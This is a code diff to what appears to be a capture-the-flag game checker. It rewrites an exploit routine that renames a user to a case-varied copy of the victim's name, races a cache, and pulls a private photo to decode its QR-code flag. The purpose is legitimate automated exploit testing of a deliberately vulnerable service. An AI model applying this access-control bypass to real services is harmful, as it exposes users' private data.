@@ -378,7 +378,7 @@ async def exploit_censor(
 
 
 @checker.exploit(1)
-async def exploit_cache(
+async def exploit_cache_race(
     task: ExploitCheckerTaskMessage,
     searcher: FlagSearcher,
     conn: Connection,
@@ -389,20 +389,33 @@ async def exploit_cache(
 
     u: User = user.random_user()
     cookies = await user.register(conn, u)
-
     nu = replace(u, name=utils.random_capitalize(username))
 
-    await user.update(conn, nu, cookies)
-    profile = await user.get_profile(conn, nu.name, cookies)
+    for attempt in range(20):
+        await user.update(conn, nu, cookies)
 
-    pid: Photo = photo.get_by_description_contains(
-        profile, "could be a flag but you cant see it"
-    ).public_id
-    p: Photo = await photo.get(conn, pid)
-
-    data = await photo.get_data_public(conn, p.asset_id, cookies)
-
-    return qr.decode(data)
+        r = await conn.get(
+            f"/napi/users/{nu.name}/photos", cookies=cookies, timeout=15
+        )
+        if r.status_code != 200:
+            continue
+        for pdata in r.json():
+            if "could be a flag but you cant see it" in pdata.get(
+                "description", ""
+            ):
+                pd = await conn.get(
+                    f"/napi/photos/{pdata['public_id']}",
+                    cookies=cookies,
+                    timeout=15,
+                )
+                photo_data = pd.json()
+                asset_id = photo_data["thumbnail"]["asset_id"]
+                data = await conn.get(
+                    f"/images/photo-{asset_id}",
+                    cookies=cookies,
+                    timeout=15,
+                )
+                return qr.decode(data.content)
 
 
 @checker.putflag(2)
